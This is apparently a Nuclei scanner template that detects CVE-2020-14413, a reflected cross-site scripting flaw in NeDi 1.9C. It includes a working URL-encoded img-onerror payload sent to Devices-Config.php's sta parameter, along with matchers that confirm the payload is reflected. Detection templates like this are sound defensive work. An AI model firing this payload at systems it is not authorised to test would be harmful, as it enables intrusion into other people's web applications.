id: cve-2020-14413
info:
  author: pikpikcu
  description: NeDi 1.9C is vulnerable to XSS because of an incorrect implementation
    of sanitize() in inc/libmisc.php. This function attempts to escape the SCRIPT
    tag from user-controllable values, but can be easily bypassed, as demonstrated
    by an onerror attribute of an IMG element as a Devices-Config.php?sta= value.
  name: NeDi 1.9C XSS
  reference: https://gist.github.com/farid007/8db2ab5367ba00e87f9479b32d46fea8
  severity: medium
  tags: cve,cve2020,nedi,xss
requests:
- matchers:
  - part: body
    type: word
    words:
    - <img src=x onerror=alert(document.domain)>
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/Devices-Config.php?sta=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E'
